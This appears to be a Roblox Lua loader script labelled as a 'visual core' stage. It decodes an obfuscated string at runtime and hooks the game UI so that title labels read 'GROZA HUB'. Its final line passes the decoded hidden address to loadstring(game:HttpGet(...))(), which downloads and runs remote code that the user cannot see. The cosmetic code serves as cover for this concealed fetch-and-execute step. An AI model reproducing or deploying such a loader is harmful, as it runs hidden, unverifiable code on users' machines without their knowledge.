
--[[ STAGE 2: VISUAL CORE ]]
local OS3M6LDuUETavefOQUMg="\252\238\228\230\223\140\151\141\198\211\055\244\059\051\028\038\017\028\005\001\009\116\003\109\106\094\101\084\072\008\083\189\185\113\174\165\162\171\149\155\137\147\254\241\248\169\242\216\221\221\211\061\205\062\052\237\041\051\033\020\211\037\028\047\038\022\021\117\127\090\093\091\080\081\102\186\165\185\070\157\071\150\145\134\147\148\249\244\224\130\218\223\209\215\232\059\198\193\203\037\025\020\035\027\027\019\056\007\047\042\108\105\101\016\076\067\077"local mwmy9x9vIOcsAnX8R=60 local lfC9ENXmPttvel4FndA=60 local Oy_trZkqjnO6P=1 local KmlWiB4BCq9qpruktn=6 local d1Nkn5zL54Jj2QVw4Gko=22 local aOL7cVXPb1Q1zlH4WqcM=false local Qw6Abm3jsflHBJ=bit32 and bit32.bxor if not Qw6Abm3jsflHBJ then Qw6Abm3jsflHBJ=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local AW4v7h1Bc_8l={}for DN6IZml2BpgapX=1,#OS3M6LDuUETavefOQUMg do local KkH9L48HVGd1S=string.byte(OS3M6LDuUETavefOQUMg,DN6IZml2BpgapX)local dxcZCd29XpR2BAS=(lfC9ENXmPttvel4FndA+(DN6IZml2BpgapX*KmlWiB4BCq9qpruktn)+d1Nkn5zL54Jj2QVw4Gko)%256 if Oy_trZkqjnO6P==0 then KkH9L48HVGd1S=(KkH9L48HVGd1S-dxcZCd29XpR2BAS)%256 AW4v7h1Bc_8l[DN6IZml2BpgapX]=string.char(Qw6Abm3jsflHBJ(KkH9L48HVGd1S,mwmy9x9vIOcsAnX8R))else KkH9L48HVGd1S=Qw6Abm3jsflHBJ(KkH9L48HVGd1S,mwmy9x9vIOcsAnX8R)AW4v7h1Bc_8l[DN6IZml2BpgapX]=string.char((KkH9L48HVGd1S-dxcZCd29XpR2BAS)%256)end end local XWS624mA0zgik6JSXp2=table.concat(AW4v7h1Bc_8l)if aOL7cVXPb1Q1zlH4WqcM then XWS624mA0zgik6JSXp2=string.reverse(XWS624mA0zgik6JSXp2)end local CDS2F5_YClPMPY=XWS624mA0zgik6JSXp2
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(CDS2F5_YClPMPY))()
